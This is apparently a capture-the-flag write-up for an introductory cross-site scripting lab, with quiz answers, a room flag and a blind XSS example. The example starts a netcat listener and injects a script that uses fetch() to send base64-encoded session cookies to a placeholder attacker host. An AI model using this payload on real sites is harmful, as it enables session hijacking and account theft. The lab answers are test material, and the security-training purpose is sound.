# Intro to Cross-site Scripting

### Room Brief
- What does XSS stand for? `Cross-Site Scripting`

### XSS Payloads
- Which document property could contain the user's session token? `document.cookie`
- Which JavaScript method is often used as a Proof Of Concept? `alert`

### Reflected XSS
- Where in an URL is a good place to test for reflected XSS? `parameters`

### Stored XSS
- How are stored XSS payloads usually stored on a website? `database`

### DOM Based XSS
- What unsafe JavaScript method is good to look for in source code? `eval()`

### Blind XSS
- What tool can you use to test for Blind XSS? `XSS Hunter Express`
- What type of XSS is very similar to Blind XSS? `Stored XSS`

### Perfecting your payload
- What is the flag you received from level six? `THM{XSS_MASTER}`

### Practical Example (Blind XSS)
We want to steal the cookie of a member of the staff with a stored XSS.<br />
Start a netcat listener: `nc -lnvp 4444`. Now inject the following payload: `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>` <br />
![image](https://github.com/user-attachments/assets/4cb16704-c0c6-42b9-a4bf-9b15c4c6d2a4)<br />
Now take the base64 encoded cookie and decode it: <br />
![image](https://github.com/user-attachments/assets/e5e0e863-76a7-4ea5-ab80-9046139f0082)<br />
`4AB305E55955197693F01D6F8FD2D321`



